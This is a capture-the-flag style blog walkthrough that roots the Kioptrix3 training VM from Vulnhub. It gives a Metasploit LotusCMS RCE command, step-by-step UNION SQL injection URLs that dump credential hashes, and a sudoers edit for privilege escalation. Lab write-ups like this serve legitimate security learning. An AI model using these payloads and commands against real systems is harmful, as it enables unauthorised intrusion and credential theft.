---
layout: single
title: "Vulnhub - Kioptrix3"
header:
  overlay_image: /assets/img/thumbnails/thmbn-01.jpg
  caption: "[__Vulnhub__](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)"
excerpt: "Hack the planet!"
related: true
comments: true
---

# Introduction

In this writeup I will continue [Kioptrix series](https://www.vulnhub.com/series/kioptrix,8/) made by [loneferret](https://twitter.com/@loneferret). Supposedly, there are multiple working exploits! How many can we find? Let's see... Kioptrix 3 here I come!

***

# Scanning and enumeration

Start a simple ARP scan with netdiscover to reveal target IP:

```console
 root@EdgeOfNight:~# netdiscover

 Currently scanning: 192.168.46.0/16   |   Screen View: Unique Hosts                                                                                                                                              
                                                                                                                                                                                                                  
 12 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 720                                                                                                                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.11     [REDACTED]  	      2       120  Intel Corporate                                                                                                                                                
 192.168.1.15     08:00:27:08:00:ba   1        60  PCS Systemtechnik GmbH                                                                                                                                         
 192.168.1.12     [REDACTED]  	      1        60  Unknown vendor                                                                                                                                                 
 192.168.1.18     [REDACTED] 	      1        60  Apple, Inc.                                                                                                                                                    
 192.168.1.1      [REDACTED] 	      3       180  Unknown vendor                                                                                                                                           
 192.168.1.10     [REDACTED]          1        60  Unknown vendor                                                                                                                                                 
 192.168.1.20     [REDACTED]          1        60  Unknown vendor                                                                                                                                                 
 192.168.1.19     [REDACTED]          1        60  LG Innotek                                                                                                                                                     
 192.168.1.23     [REDACTED]          1        60  Unknown vendor     
```                                                                                                                                            

Kioptrix3 has been assigned an IP of **192.168.1.15**. For the sake of simplicity I'll add the IP into **/etc/hosts** file for easier navigation later on. Do this using `echo "192.168.1.15 kioptrix3.com >> /etc/hosts"`. This allows us to reference the machine as `kioptrix3.com` instead of `192.168.1.15`.

<div class="notice--warning">
  <h4>WARNING!</h4>
  <p>Make sure you do not overwrite your hosts file by inputting only one <b>&gt;</b></p>
</div>

My next step is a simple `nmap` portscan to detect open ports & running services.

```console
root@EdgeOfNight:~# nmap kioptrix3.com -A -T5 

Starting Nmap 7.50 ( https://nmap.org ) at 2017-10-21 13:22 CDT
Nmap scan report for kioptrix3.com (192.168.1.15)
Host is up (0.00021s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 08:00:27:08:00:BA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms kioptrix3.com (192.168.1.15)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds
```

HTTP (80) and SSH (80) are both open. I wonder what does the webpage look like?

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-01.png">

Cool. Clicking *Login* shows:
   
<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-02.png">

and clicking *here* redirects to a gallery:

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-03.png">

***

# Exploitation
Wait, really? Why was the recon so fast? No dirbuster, nikto, spidering? There are still many possible reconnaissance steps I could do, however to keep my writeup short I'll focus on *(hopefully)* two main exploitation methods via `LotusCMS` and the `gallery`.

***

## Shell - LotusCMS
Fortunately enough, I encountered LotusCMS vulnerability once already and therefore getting a reverse shell was easy. LotusCMS is seeded with various vulnerabilites such as an **RCE** or an **LFI**. More can be found by querying searchsploit:

```console
root@EdgeOfNight:~# searchsploit LotusCMS
------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                     |  Path
                                                                   | (/usr/share/exploitdb/platforms/)
--------------------------------------------------------------------- --------------------------------
LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)      | php/remote/18565.rb
LotusCMS 3.0.3 - Multiple Vulnerabilities                          | php/webapps/16982.txt
------------------------------------------------------------------- ----------------------------------
```      

Look! A metasploit RCE module. I usually avoid metasploit modules (and you should too), however I'll use it just once for simplicity. `msfconsole -x "use exploit/multi/http/lcms_php_exec; set URI /; set RHOST kioptrix3.com;run"` yields a www-data shell.

<div class="notice--info">
  <h4>Tip:</h4>
  <p><b>msfconsole -x</b> combines all commands into one</p>
</div>
   
After that just view **/home/** directory which shows 2 users - **dreg** and **loneferret**, fire up hydra and brute both of their SSH accounts! Users done. Sorry for not going into much detail when describing the steps! I find this way of getting an user rather stupid, which led to my quick explanation. If you despise using msfconsole, there is a [tool](https://github.com/Hood3dRob1n/LotusCMS-Exploit) on github which can do the same thing.

***

## Shell - SQL injection inside /gallery/

Visit the previously mentioned webpage. Inside **Libgoat Press Room** gallery allows sorting of photos by IDs which possibly opens up an SQL injection attack.       

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-04.png">

Unfortunately explaining the whole idea behind these injections would take ages. I recommend either `SqlMap` (check below) or learning [manual injecting](http://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/) before reading the rest. So, do you see the URL? Changing `id=1` to `id='` causes a query error.

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-05.png"> 

Tadaa! SQL Injection is possible! Time to dump database contents for passwords & usernames :). 

Start out with `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,2,3,4,5,6#` to find out how many injectable columns the database has *(ORDER BY testing could be used as well)*. 

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-06.png">

We are able to see columns 2 and 3. Now we can substitute these numbers with SQL commands like **@@version** or **database()** - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,@@version,database(),4,5,6#`

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-07.png">

Dump all tables within our database() output - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,table_name,NULL,4,5,6 FROM information_schema.tables WHERE table_schema = 'gallery'#` 

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-08.png">

Knowing the table names, choose an interesting one and dump its columns - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,column_name,NULL,4,5,6 FROM information_schema.columns WHERE table_name = 'dev_accounts'#`

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-09.png"> 

Result shows us 3 columns of interest:

* id
* password
* username

Great! That's exactly what we want. All that remains is one last command which will present us with the sweet credentials - `kioptrix3.com/gallery/gallery.php?id=1 UNION SELECT 1,CONCAT(username,';',id,';',password),NULL,4,5,6 FROM dev_accounts`

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-10.png"> 

The `CONCAT()` just connects all 3 column contents into one statement with a semicolon `;` as delimeter. Ultimately, you can use SqlMap which automates the attack.

```console
root@EdgeOfNight:~# sqlmap -u kioptrix3.com/gallery/gallery.php?id=1 -T dev_accounts --dump

---CUT CUT CUT---

Database: gallery
Table: dev_accounts
[2 entries]
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+------------+----------------------------------+

---CUT CUT CUT---
```

Both hashes being non-salted MD5s, I decide to crack them. You could use a tool like `hashcat` or `johntheripper`, but I'll stick to a simple online [rainbow tables cracker](https://crackstation.net/).

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-11.png">

Doing some experimenting I find out that the passwords can be used for SSH login. *dreg* has a limited shell and therefore *loneferret*'s account will be used instead. 

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-12.png">

Boom. Time for some privilege escalation!

***

# Privilege escalation 

Snooping around for some time I discover that loneferret can use **sudo** combined with **ht** *(hex editor)*.  

```console
loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on the host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
```

**sudo ht** effectively allows us to edit any file on the system. There are many ways of escalation from such misconfiguration (for example editing public ssh keys for root, changing passwd file or editing sudoers file). I'll do the third one. Before editing the sudoers file make sure to export `TERM` so we can use the graphical component of our command - `loneferret@Kioptrix3:~$ export TERM=xterm`. Once done, open up the **ht** editor.

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-13.png">

Press F3 to prompt an input window which asks us for a file to open - in our case **/etc/sudoers**.

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-14.png">

Edit the file so that we can use sudo without limitations.  

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-15.png"> 

When done, `sudo su root` and the box is rooted! Go and get that root flag! 

<img src="/assets/img/blog/vulnhub-kioptrix3/kioptrix3-16.png">

***

# Conclusion
Fun box with a lot of small twists. I don't think I found every vulnerability, but 2 is better than none! Compared to the other boxes in the series, this one was in my opinion the hardest. Enjoyed it non the less! If you have any questions feel free to leave a comment down below or contact me. 

~V3
